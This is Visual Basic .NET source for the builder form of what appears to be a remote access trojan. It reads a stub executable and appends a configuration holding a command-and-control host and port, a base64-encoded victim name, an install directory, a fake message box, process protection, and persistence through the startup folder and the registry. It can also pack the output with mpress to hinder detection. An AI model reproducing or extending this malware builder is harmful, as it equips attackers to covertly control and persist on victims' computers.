Imports System.Text
Imports System.IO
Imports System.Threading

Public Class Form1

    Private Function III(ByVal name As String) As String
        Return Convert.ToBase64String(Encoding.UTF8.GetBytes(name))
    End Function

    Private Sub btn_OK_Click(sender As Object, e As EventArgs) Handles btn_OK.Click

        Dim I As New SaveFileDialog

        I.Title = "Save File"

        I.Filter = "Executable(*.exe)|*.exe|All Files (*.*)|*.*"

        If I.ShowDialog = DialogResult.OK Then

            Dim Y As String = "|ST|"

            Dim Stub As String

            FileOpen(1, "Stub.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)

            Stub = Space(LOF(1))

            FileGet(1, Stub)

            FileClose(1)

            '|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

            FileOpen(1, I.FileName, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)

            FilePut(1, Stub & Y & III(vt_txt.Text) & Y & TXT_Host.Text & Y & nd_port.Value & Y & CK_Copy.Checked.ToString & Y & process_txt.Text & Y & CB_Directory.Text & Y & CK_Msgbox.Checked.ToString & Y & title_text.Text & Y & message_text.Text & Y & CK_ProtectProcess.Checked.ToString & Y & CK_CopyStartUp.Checked.ToString & Y & CK_RegistryStartUp.Checked.ToString & Y)

            FileClose(1)
            If Me.CKUpx.Checked Then
                Application.DoEvents()
                If Not Directory.Exists((Application.StartupPath & "\UPX")) Then
                    Directory.CreateDirectory((Application.StartupPath & "\UPX"))
                End If
                Thread.Sleep(50)
                If Not File.Exists((Application.StartupPath & "\UPX\mpress.exe")) Then
                    Dim mpress As Byte() = My.Resources.mpress
                    File.WriteAllBytes((Application.StartupPath & "\UPX\mpress.exe"), mpress)
                End If
                Thread.Sleep(50)
                Shell(("cmd.exe /C UPX\mpress.exe -s """ & I.FileName & """"), AppWinStyle.NormalFocus, True, -1)
            End If
            MsgBox("File Builded To" & vbNewLine & I.FileName, MsgBoxStyle.Information, "DONE!")
        End If
    End Sub

    Private Sub CK_Msgbox_CheckedChanged(sender As Object, e As EventArgs) Handles CK_Msgbox.CheckedChanged
        If CK_Msgbox.Checked = True Then
            GB_Message.Enabled = True
        Else
            GB_Message.Enabled = False
        End If
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        CB_Directory.SelectedIndex = 0
    End Sub

    Private Sub CK_Copy_CheckedChanged(sender As Object, e As EventArgs) Handles CK_Copy.CheckedChanged
        If CK_Copy.Checked = True Then
            GB_DER.Enabled = True
        Else
            GB_DER.Enabled = False
        End If

    End Sub
End Class
